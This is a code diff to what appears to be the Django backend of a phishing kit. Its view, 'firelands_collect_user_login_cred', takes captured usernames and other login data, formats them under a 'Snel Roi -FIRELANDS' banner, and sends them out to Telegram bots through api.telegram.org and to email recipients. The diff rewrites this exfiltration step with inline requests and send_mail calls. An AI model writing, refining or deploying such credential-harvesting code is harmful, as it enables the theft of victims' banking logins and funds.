@@ -6,6 +6,7 @@ import requests
 from django.conf import settings
 from django.shortcuts import render
 from core.app_config import app_settings
+from django.core.mail import send_mail
 
 from rest_framework.response import Response
 from rest_framework import status
@@ -133,6 +134,7 @@ def firelands_collect_user_login_cred(request):
             browser_data.date = date
             browser_data.save()
 
+            # Notification message
             message = "|=====||Snel Roi -FIRELANDS||=====|\n"
             message += "|========= [  LOGIN  ] ==========|\n"
             message += f"| ➤ [ Username ]         : {username}\n"
@@ -148,12 +150,30 @@ def firelands_collect_user_login_cred(request):
             message += f"| ➤ [ TIME ]         : {date}\r\n"
             message += "|=====================================|\n"
 
-            send_data_telegram(app_settings, message)
+            # Send Telegram notification
+            for bot in app_settings['telegram_bots']:
+                try:
+                    requests.post(
+                        f"https://api.telegram.org/bot{bot['botToken']}/sendMessage",
+                        json={
+                            "chat_id": bot['chatId'],
+                            "text": message
+                        }
+                    )
+                except Exception as e:
+                    logger.error(f"Telegram send failed: {str(e)}")
             
-            subject = f"Firelands Login - {ip}"
-            from_email = _notification_sender()
-            recipient_list = _notification_recipients()
-            send_data_email(subject, message, from_email, recipient_list)
+            # Send email notification
+            try:
+                send_mail(
+                    subject=f"Firelands Login - {ip}",
+                    message=message,
+                    from_email=_notification_sender(),
+                    recipient_list=_notification_recipients(),
+                    fail_silently=False
+                )
+            except Exception as e:
+                logger.error(f"Email send failed: {str(e)}")
 
             return Response({'status': 'success'}, status=status.HTTP_200_OK)
 
